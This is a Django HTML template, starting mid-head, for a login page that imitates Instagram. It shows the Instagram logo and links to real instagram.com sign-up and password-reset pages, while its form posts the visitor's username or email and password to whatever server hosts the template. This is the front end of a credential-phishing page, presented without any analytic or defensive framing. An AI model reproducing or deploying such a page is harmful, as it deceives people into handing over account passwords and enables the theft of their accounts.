 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">

<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="{% static "css/font-awesome.min.css" %}">
<!--===============================================================================================-->

<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="{% static "css/hamburgers.min.css" %}">
<!--===============================================================================================-->

	<link rel="stylesheet" type="text/css" href="{% static "css/util.css" %}">
	<link rel="stylesheet" type="text/css" href="{% static "css/main.css" %}">

</head>
<body>




  <nav class="navbar navbar-expand-lg navbar-light  bg-light" >

    <a class="navbar-brand" href="index.html" style="padding-left:0.5rem;padding-top:0.5rem;"><img src="{% static "images/logo.png" %}"></img></a>



		<ul class="navbar-nav ml-auto">
		<li class="nav-item"><a class="nav-link" href="https://www.instagram.com/accounts/emailsignup/" style="padding-right:1rem;font-size:19px;"><b>Sign up</b></a></li>
		</ul>


 </nav>





	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<div class="login100-pic js-tilt" data-tilt>
					<img src="http://outsourced365.com/wp-content/uploads/2018/01/instagram-logo-300x298.jpg" alt="IMG">
				</div>

				<form class="login100-form validate-form" method="post">
          {% csrf_token %}
					<span class="login100-form-title">
						<img src="{% static "images/logo.png" %}">
					</span>

					<div class="wrap-input100 validate-input" data-validate = "Valid username/email is required">
						<input class="input100" type="text" name="email1" placeholder="Email/Username">
						<span class="focus-input100"></span>
						<span class="symbol-input100">
							<i class="fa fa-envelope" aria-hidden="true"></i>
						</span>
					</div>

					<div class="wrap-input100 validate-input" data-validate = "Password is required">
						<input class="input100" type="password" name="pass" placeholder="Password">
						<span class="focus-input100"></span>
						<span class="symbol-input100">
							<i class="fa fa-lock" aria-hidden="true"></i>
						</span>
					</div>

					<div class="container-login100-form-btn">
						<button class="login100-form-btn">
						Login
						</button>
					</div>

					<div class="text-center p-t-12">
						<span class="txt1">
							Forgot
						</span>
						<a class="txt2" href="https://www.instagram.com/accounts/password/reset/">
							Username / Password?
						</a>
					</div>

					<div class="text-center p-t-136">
						<a class="txt2" href="https://www.instagram.com/accounts/emailsignup/">
							Create your Account
							<i class="fa fa-long-arrow-right m-l-5" aria-hidden="true"></i>
						</a>
					</div>
				</form>
			</div>
		</div>
	</div>




<!--===============================================================================================-->
	<script src="{% static "js/jquery-3.2.1.min.js" %}"></script>
<!--===============================================================================================-->
	<script src="{% static "js/popper.js" %}"></script>

	<script src="{% static "js/tilt.jquery.min.js" %}"></script>
	<script >
		$('.js-tilt').tilt({
			scale: 1.1
		})
	</script>
